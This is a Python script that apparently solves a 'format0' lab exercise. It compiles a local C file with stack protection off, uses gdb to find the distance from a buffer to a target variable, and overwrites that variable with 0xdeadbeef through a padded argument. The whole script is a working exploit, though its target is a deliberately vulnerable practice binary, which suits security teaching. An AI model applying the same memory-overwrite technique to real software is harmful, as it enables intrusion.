#!/usr/bin/env python3
# Python 3.4+ compatible helper patterns.
import os, sys, stat, subprocess, tempfile
from pathlib import Path

def which(cmd):
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = str(Path(d) / cmd)
        if os.path.exists(p) and os.access(p, os.X_OK):
            return p
    return None

def ensure_executable(p):
    st = p.stat()
    if st.st_mode & stat.S_IXUSR:
        return
    p.chmod(st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

def run_capture(argv, stdin_bytes=None, env=None):
    p = subprocess.Popen(
        argv,
        stdin=subprocess.PIPE if stdin_bytes is not None else None,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env,
    )
    out, _ = p.communicate(stdin_bytes)
    try:
        out_s = out.decode("utf-8", "replace")
    except Exception:
        out_s = str(out)
    return p.returncode, out_s

def gcc_build(out_path, src_path, extra=None):
    cc = which("gcc")
    if not cc:
        return False, "gcc not found\n"
    # On Ubuntu 14.04 (gcc 4.8), binaries are non-PIE by default and -nopie is unsupported.
    cmd = [cc, "-m32", "-g", "-fno-stack-protector", "-z", "execstack", "-o", str(out_path), str(src_path)]
    if extra:
        cmd[1:1] = extra
    rc, out = run_capture(cmd)
    return rc == 0 and Path(out_path).exists(), out

import struct

SUCCESS = "you have hit the target correctly"

def p32(x):
    return struct.pack("<I", x & 0xffffffff)

def fsenc(s):
    try:
        return os.fsencode(s)
    except Exception:
        return s.encode("utf-8")

def gdb_offset(binary):
    gdb = which("gdb")
    if not gdb:
        return None, "gdb not found\n"
    script = "\n".join([
        "set pagination off",
        "set confirm off",
        "file " + str(binary),
        "break vuln",
        "run AAAA",
        "printf \"%d\\n\", (int)((char*)&target - (char*)&buffer)",
        "quit",
        "",
    ])
    with tempfile.NamedTemporaryFile("w", prefix="format0-", suffix=".gdb", delete=False) as f:
        f.write(script)
        sp = f.name
    try:
        rc, out = run_capture([gdb, "-q", "-nx", "-batch", "-x", sp])
    finally:
        try:
            os.unlink(sp)
        except OSError:
            pass
    off = None
    for line in out.splitlines()[::-1]:
        line = line.strip()
        if line.isdigit() or (line.startswith("-") and line[1:].isdigit()):
            off = int(line)
            break
    return off, out

def main():
    here = Path(__file__).resolve().parent
    src = here / "0.c"
    binp = here / "format0"

    ok, out = gcc_build(binp, src)
    sys.stdout.write(out)
    if not ok:
        sys.stderr.write("[!] build failed. In the Docker lab container you should have 32-bit headers.\n")
        return 2
    ensure_executable(binp)

    off, dbg = gdb_offset(binp)
    if off is None or off <= 0 or off > 256:
        sys.stderr.write("[!] failed to compute offset via gdb\n")
        sys.stderr.write(dbg + "\n")
        return 2

    payload = b"A" * off + p32(0xdeadbeef)
    # Python 3.4 on Trusty often has ASCII filesystem encoding; pass argv as bytes.
    rc, out = run_capture([fsenc(str(binp)), payload])
    sys.stdout.write(out)
    if SUCCESS in out:
        print("[+] success")
        return 0
    print("[-] failed")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
